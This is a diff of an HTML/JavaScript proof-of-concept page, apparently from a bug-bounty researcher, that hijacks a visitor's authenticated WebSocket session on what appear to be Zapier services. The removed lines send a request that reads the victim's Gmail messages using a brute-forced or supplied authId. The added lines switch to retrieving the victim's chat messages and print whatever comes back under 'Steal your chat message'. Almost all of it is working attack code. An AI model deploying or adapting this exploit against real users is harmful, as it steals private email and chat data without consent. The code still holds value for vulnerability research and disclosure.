@@ -4,57 +4,40 @@
 	  <iframe frameborder="0" hspace="0" vspace="0" style="display:none" src="https://transfer.zapier.com/new"></iframe>
 	  <script language="javascript" type="text/javascript">
     	 //load the iframe
-          window.open("https://transfer.zapier.com/new");
-	  var wsUri = "wss://transfer-api.zapier.com/v1/ws/records/";
+	  var wsUri = "wss://makerpad.zapier.com/cable";
 	  var output;
           var token;
-	  var bruteId = 34028870
-	  let authId = new URLSearchParams(location.search).get('authId');
+	  
 	  function init()
 	  {
-		output = document.getElementById("output");
-		if(typeof authId === 'undefined'){writeToScreen("No authId params found!");return;}
-		writeToScreen("Try to brute your authId......");
-		testWebSocket(authId)
+		writeToScreen("Start to steal your chat message......");
 	  }
 
 	  function testWebSocket(authId)
 	  {	
 		websocket = new WebSocket(wsUri);
-		websocket.onopen = function(evt) { onOpen(evt,authId) };
+		websocket.onopen = function(evt) { onOpen(evt) };
 		websocket.onclose = function(evt) { onClose(evt) };
 		websocket.onmessage = function(evt) { onMessage(evt) };
 		websocket.onerror = function(evt) { onError(evt) };
 	  }
 
-	  function onOpen(evt,authId)
+	  function onOpen(evt)
 	  {
 		writeToScreen("CONNECTED");
-		writeToScreen("authId is " + authId);
-			//setInterval(testWebSocket(i),4000);
-		doSend('{"read_config":{"accountId":"1111111","action":"search","selectedAPI":"GoogleMailV2API","authId":'+ authId +',"params":{"query":"facebook"},"typeOf":"read_bulk","zapId":"111111"}}');
+		doSend('{"command":"message","identifier":"{\"channel\":\"Storefront::Messaging::MessagesChannel\"}","data":"{\"action\":\"retrieve_messages\"}"}');
 		//doSend('{"read_config":{"accountId":"1111111","action":"search","selectedAPI":"GoogleMailV2API","authId":'+ authId +',"params":{"query":"facebook"},"typeOf":"read_bulk","zapId":"111111"}}');
 	  }
 
 	  function onClose(evt)
 	  {
-		writeToScreen("DISCONNECTED");
-		//bruteId++;
-		//if(bruteId != 34028874){
-		//  testWebSocket(bruteId)
-		//}
+		writeToScreen("DISCONNECTED");	
 	  }
 
 	  function onMessage(evt)
 	  {
 	 	let data = JSON.parse(evt.data);
-        	if(data.type === "END_READ"||data.type === "READ_ERROR"){
-                	//writeToScreen('<span style="color: red;">Your email content:</span> ');
-		    	//just a POC for prove the impact,Didn't wrote a feature for keeping on WSS connection.
-			
-		}else{
-			writeToScreen('<span style="color: red;">BOOM!Your email content:</span> ' + JSON.stringify(data));
-		}
+		writeToScreen('<span style="color: red;">BOOM!Your email content:</span> ' + JSON.stringify(data));
 	  }
 
 	  function onError(evt)
@@ -80,6 +63,6 @@
 
 	  </script>
 
-	  <h2>Steal your gmail information,POC johnstone</h2>
+	  <h2>Steal your chat message,POC johnstone</h2>
 
 	  <div id="output"></div>
